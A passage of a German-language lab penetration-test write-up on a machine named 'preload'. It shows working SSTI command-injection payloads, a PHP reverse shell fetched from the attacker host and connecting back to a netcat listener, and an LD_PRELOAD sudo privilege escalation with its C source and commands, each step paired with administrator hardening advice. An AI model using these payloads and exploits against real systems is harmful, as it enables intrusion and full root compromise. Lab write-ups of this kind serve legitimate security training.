+                <strong>Bewertung:</strong> Der Download-Befehl wurde erfolgreich an den Server gesendet. Der nächste Schritt ist, den Webserver auf dem Angreifer-System zu starten, um die Datei bereitzustellen.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starten Sie einen einfachen HTTP-Server auf dem Angreifer-System im Verzeichnis, das die Reverse-Shell-Datei (`r`) enthält. Überprüfen Sie auf dem Zielsystem (mittels SSTI), ob die Datei `/tmp/reverse.php` erfolgreich erstellt wurde.
+                <br>
+                <strong>Empfehlung (Admin):** Blockieren Sie ausgehende Verbindungen vom Webserver (Egress Filtering), insbesondere zu ungewöhnlichen Ports. Überwachen Sie Prozesse wie `wget` oder `curl`, die vom Webserver-Benutzer gestartet werden.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein einfacher Python-HTTP-Server wird auf dem Angreifer-System (IP 192.168.2.130, wie im `wget`-Befehl verwendet) auf Port 9000 gestartet. Dieser Server stellt die Reverse-Shell-Datei (`r`) zum Download bereit. Die Log-Ausgaben zeigen zwei erfolgreiche GET-Anfragen für `/r` von der IP des Zielsystems (192.168.2.129), was den erfolgreichen Download bestätigt.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 9000</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+192.168.2.129 - - [21/Apr/2023 00:30:16] "GET /r HTTP/1.1" 200 -
+192.168.2.129 - - [21/Apr/2023 00:39:12] "GET /r HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Payload wurde erfolgreich auf das Zielsystem übertragen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Existenz der Datei `/tmp/reverse.php` auf dem Zielsystem mittels SSTI. Starten Sie einen Netcat-Listener, um die eingehende Verbindung abzufangen. Führen Sie dann `/tmp/reverse.php` auf dem Zielsystem aus (ebenfalls via SSTI).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu Egress Filtering und Prozessüberwachung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Existenz der heruntergeladenen Reverse-Shell-Datei wird mittels SSTI und `ls /tmp` überprüft.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('ls%20/tmp').read()\}\}"</span></div>
+                     <pre>
+reverse.php
+systemd-private-076726df53af420fb64765e8e504ef33-systemd-logind.service-e6vgqj
+systemd-private-076726df53af420fb64765e8e504ef33-systemd-timesyncd.service-4K07ag
+                     </pre> <!-- Ausgabe gekürzt -->
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei `reverse.php` existiert im `/tmp`-Verzeichnis auf dem Zielsystem. Alles ist bereit für die Ausführung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starten Sie den Netcat-Listener.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie das `/tmp`-Verzeichnis auf verdächtige Dateien. Mounten Sie `/tmp` nach Möglichkeit mit `noexec`-Option.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port 9001 gestartet, um die eingehende Reverse Shell abzufangen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Listener ist bereit.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie die `reverse.php` auf dem Ziel via SSTI aus.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+             </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die heruntergeladene PHP-Reverse-Shell (`/tmp/reverse.php`) wird auf dem Zielsystem mittels SSTI ausgeführt. Der Befehl lautet `php -f /tmp/reverse.php`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('php%20-f%20/tmp/reverse.php').read()\}\}"</span></div>
+                     <pre>
+[Keine Ausgabe von curl, da die PHP-Shell im Hintergrund startet und verbindet]
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl zur Ausführung der Reverse Shell wurde erfolgreich gesendet.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Netcat-Listener-Fenster.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie die Ausführung von PHP-Skripten aus ungewöhnlichen Orten wie `/tmp`. Deaktivieren Sie ggf. die PHP-Ausführung für den Webserver-Benutzer, wenn sie nicht benötigt wird.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Netcat-Listener auf Port 9001 zeigt die erfolgreiche eingehende Verbindung von der Ziel-IP (192.168.2.129). Systeminformationen werden angezeigt, und eine Shell-Prompt (`$`) erscheint. Die Fehlermeldung `can't access tty; job control turned off` ist typisch für einfache Reverse Shells.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.130] from (UNKNOWN) [192.168.2.129] 42384
+Linux preload 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+ 18:42:43 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(paul) gid=1000(paul) groups=1000(paul)
+/bin/sh: 0: can't access tty; job control turned off
+$
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Eine interaktive Shell wurde erfolgreich als Benutzer `paul` etabliert. Der Initial Access über die SSTI-Schwachstelle und die anschließende Reverse Shell waren erfolgreich.
+             </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell für bessere Interaktivität und beginnen Sie mit der Enumeration für die Rechteausweitung.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Untersuchen und beheben Sie die SSTI-Schwachstelle. Überwachen Sie ausgehende Verbindungen und verdächtige Prozesse. Entfernen Sie die Reverse-Shell-Datei `/tmp/reverse.php`.
+             </p>
+        </section>
+
+        <section id="privilege-escalation-poc">
+            <h2>Privilege Escalation (LD_PRELOAD - POC)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die erhaltene Reverse Shell wird stabilisiert.
+                1. `which python3`: Überprüft, ob Python 3 verfügbar ist.
+                2. `python3 -c "import pty;pty.spawn('/bin/bash')"`: Startet eine Bash-Shell in einem Pseudo-Terminal.
+                3. `export TERM=xterm`: Setzt die Terminal-Variable.
+                4. `Ctrl+Z`: Sendet Netcat in den Hintergrund (Angreifer-Seite).
+                5. `stty raw -echo; fg`: Versetzt das lokale Terminal in den Raw-Modus und holt Netcat zurück (Angreifer-Seite).
+                6. `reset`: Setzt das Terminal in der Remote-Shell zurück.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">$ <span class="command">which python3</span></div>
+                    <pre>/usr/bin/python3</pre>
+                    <div class="prompt" style="color: yellow;">$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                    <pre>paul@preload:/$</pre> <!-- Prompt ändert sich zu einer Bash-Prompt -->
+                     <div class="prompt" style="color: yellow;">paul@preload:/$ <span class="command">export TERM=xterm</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">paul@preload:/$ <span class="command">[Ctrl+Z gedrückt]</span></div>
+                     <pre>
+zsh: suspended  nc -lvnp 9001
+                     </pre> <!-- Ausgabe auf Angreifer-System -->
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+                     </pre> <!-- Ausgabe auf Angreifer-System, 'reset' wird an Remote gesendet -->
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">paul@preload:/$</div> <!-- Finale stabile Prompt -->
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell ist nun stabil und voll interaktiv. Die Voraussetzungen für die weitere Enumeration und die Privilegienerweiterung sind geschaffen.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus, um die sudo-Berechtigungen für den Benutzer `paul` zu überprüfen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die Sudo-Berechtigungen des aktuellen Benutzers (`paul`) zu ermitteln.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">paul@preload:/$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for paul on preload:
+    env_reset, mail_badpass, env_keep+=LD_PRELOAD,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paul may run the following commands on preload:
+    (root) NOPASSWD: /usr/bin/cat, /usr/bin/cut, /usr/bin/grep, /usr/bin/tail,
+        /usr/bin/head, /usr/bin/ss
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund für Privilege Escalation!**
+                *   Benutzer `paul` kann mehrere Standard-Linux-Befehle (`cat`, `cut`, `grep`, `tail`, `head`, `ss`) als `root` **ohne Passwort** (`NOPASSWD`) ausführen.
+                *   Entscheidend ist `env_keep+=LD_PRELOAD`. Das bedeutet, dass die Umgebungsvariable `LD_PRELOAD` erhalten bleibt, wenn `sudo` verwendet wird. `LD_PRELOAD` kann verwendet werden, um eine benutzerdefinierte Shared Library vor allen anderen Bibliotheken zu laden, wenn ein Programm gestartet wird. Da `paul` Programme als `root` starten kann und `LD_PRELOAD` erhalten bleibt, kann eine eigene Library erstellt werden, die beim Start eines `sudo`-Befehls mit Root-Rechten geladen wird und Root-Code ausführt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die `LD_PRELOAD`-Technik zur Rechteausweitung. Erstellen Sie eine C-Datei mit einer `_init()`-Funktion, die Root-Rechte erlangt (z.B. `setuid(0); setgid(0);`) und eine Shell startet (`system("/bin/sh");`). Kompilieren Sie diese als Shared Object (`.so`). Führen Sie dann einen der erlaubten `sudo`-Befehle (z.B. `sudo /usr/bin/cat`) mit gesetzter `LD_PRELOAD`-Variable aus, die auf das kompilierte Shared Object zeigt.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie `env_keep+=LD_PRELOAD` aus der `sudoers`-Konfiguration, es sei denn, es ist absolut und nachweislich notwendig (was selten der Fall ist). Entfernen Sie außerdem die `NOPASSWD`-Regeln für Standardbefehle wie `cat`, `cut` etc. Solche Berechtigungen sind extrem gefährlich. Gewähren Sie `sudo`-Zugriff nur für spezifische, notwendige Befehle und Skripte, und vermeiden Sie `NOPASSWD`.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Proof of Concept für die LD_PRELOAD-Privilegienerweiterung.
+                1.  Wechseln ins `/tmp`-Verzeichnis.
+                2.  Erstellen einer C-Datei (`shell.c`) mit `nano` (oder `vi`). Der Code enthält eine `_init`-Funktion. Diese spezielle Funktion wird automatisch ausgeführt, wenn eine Shared Library geladen wird. Sie hebt die `LD_PRELOAD`-Variable auf (um Endlosschleifen zu vermeiden), setzt die User-ID und Group-ID auf 0 (root) und startet eine Shell (`/bin/sh`).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">paul@preload:/$ <span class="command">cd /tmp/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">paul@preload:/tmp$ <span class="command">nano shell.c</span></div>
+                     <pre>
+ #include <stdio.h>
+ #include <sys/types.h>
+ #include <stdlib.h>
+
+ void _init() {
+
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/sh");
+
+ }
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der C-Code für den Exploit ist korrekt vorbereitet. Die `_init`-Funktion ist der Schlüsselmechanismus, um Code beim Laden der Library auszuführen.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kompilieren Sie den C-Code zu einem Shared Object.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur `sudoers`-Konfiguration. Überwachen Sie Compiler-Aktivitäten (`gcc`) in ungewöhnlichen Verzeichnissen wie `/tmp`.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der C-Code (`shell.c`) wird mit `gcc` kompiliert.
+                `-fPIC`: Erzeugt positionsunabhängigen Code (Position Independent Code), notwendig für Shared Libraries.
+                `-shared`: Erzeugt ein Shared Object (eine Library) anstelle eines ausführbaren Programms.
+                `-o shell.so`: Gibt den Namen der Ausgabe-Datei an (`shell.so`).
+                `shell.c`: Die Eingabe-Quelldatei.
+                `-nostartfiles`: Verhindert das Linken der Standard-Startup-Dateien, was hier für eine einfache `_init`-Library sinnvoll ist.
+                Die Warnungen (`implicit declaration of function`) sind unschön, aber für diesen einfachen Exploit oft nicht funktionshinderlich, da die Funktionen in der Standard-C-Library vorhanden sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">paul@preload:/tmp$ <span class="command">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></div>
+                     <pre>
+shell.c: In function ‘_init’:
+shell.c:6:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    6 |  setgid(0);
+      |  ^~~~~~
+shell.c:7:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    7 |  setuid(0);
+      |  ^~~~~~
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Das Shared Object `shell.so` wurde erfolgreich im `/tmp`-Verzeichnis erstellt. Der Exploit ist bereit zur Ausführung.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie nun einen der erlaubten `sudo`-Befehle aus und setzen Sie dabei die `LD_PRELOAD`-Variable auf den Pfad zur `shell.so`-Datei.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verhindern Sie die Ausführung von Code aus `/tmp` (mount mit `noexec`). Korrigieren Sie die `sudoers`-Datei.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Exploit wird ausgelöst. Einer der erlaubten `sudo`-Befehle (`/usr/bin/cat`) wird ausgeführt. Gleichzeitig wird die Umgebungsvariable `LD_PRELOAD` auf den Pfad der eben erstellten Shared Library (`/tmp/shell.so`) gesetzt. Da `env_keep+=LD_PRELOAD` in der `sudoers`-Datei konfiguriert ist, wird `sudo` diese Variable nicht entfernen. Wenn `cat` als `root` gestartet wird, lädt der dynamische Linker zuerst `/tmp/shell.so`. Dessen `_init`-Funktion wird ausgeführt, setzt UID/GID auf 0 und startet `/bin/sh`. Das Ergebnis ist eine Root-Shell. Der `id`-Befehl wird in dieser neuen Shell ausgeführt.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">paul@preload:/tmp$ <span class="command">sudo LD_PRELOAD=/tmp/shell.so /usr/bin/cat</span></div>
+                     <pre>
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+#
+                     </pre> <!-- Die Prompt ändert sich zur Root-Prompt '#' -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Die `LD_PRELOAD`-Schwachstelle in der `sudo`-Konfiguration wurde erfolgreich ausgenutzt. Der Pentester hat nun vollen Root-Zugriff auf das System.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Root-Shell wurde erlangt. Suchen Sie nach der Root-Flag und der User-Flag. Führen Sie Post-Exploitation-Aufgaben durch.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die `sudoers`-Fehlkonfiguration (Entfernen von `env_keep+=LD_PRELOAD` und der `NOPASSWD`-Regeln für Standardbefehle). Überprüfen Sie das System auf weitere Kompromittierungen. Ändern Sie Passwörter. Erwägen Sie eine Neuinstallation, wenn eine vollständige Bereinigung nicht sichergestellt werden kann.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/paul/us3r.txt</div>
+                     <div class="flag-value"><span class="password">52f83ff6877e42f613bcd2444c22528c</span></div>
+                </div>
+
+                <div class="flag-entry">
+                      <!-- Im Text steht cat 20o7.txt, was vermutlich die root.txt ist -->
+                     <div class="flag-command">cat /root/20o7.txt (vermutet)</div>
+                     <div class="flag-value"><span class="password">09f7e02f1290be211da707a266f153b3</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem Root-Zugriff erlangt wurde, werden die User- und Root-Flags ausgelesen. Der Befehl `cat us3r.txt` (vermutlich ausgeführt in `/home/paul` oder mit vollem Pfad) liest die User-Flag. Der Befehl `cat 20o7.txt` wird im Root-Kontext ausgeführt und liest die Root-Flag (die Datei heißt hier anscheinend `20o7.txt` statt `root.txt`).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle werden aus dem Flag-Bereich am Ende des Originaltextes abgeleitet -->
+                     <div class="prompt"># <span class="command">cd /home/paul</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>
+code.py  us3r.txt
+                     </pre>
+                     <div class="prompt"># <span class="command">cat us3r.txt</span></div>
+                     <pre><span class="password">52f83ff6877e42f613bcd2444c22528c</span></pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">cat /root/20o7.txt</span></div> <!-- Pfad /root/ ist Vermutung -->
+                     <pre><span class="password">09f7e02f1290be211da707a266f153b3</span></pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Dies markiert den Abschluss der Kompromittierung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Flags selbst sind irrelevant, aber ihre Zugänglichkeit unterstreicht die Notwendigkeit, die identifizierten Schwachstellen (SSTI, unsichere sudo-Konfiguration) zu beheben.
+            </p>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-20</p> <!-- Datum aus Nikto/Exploit-Logs -->
+    </footer>
+</body>
+</html>
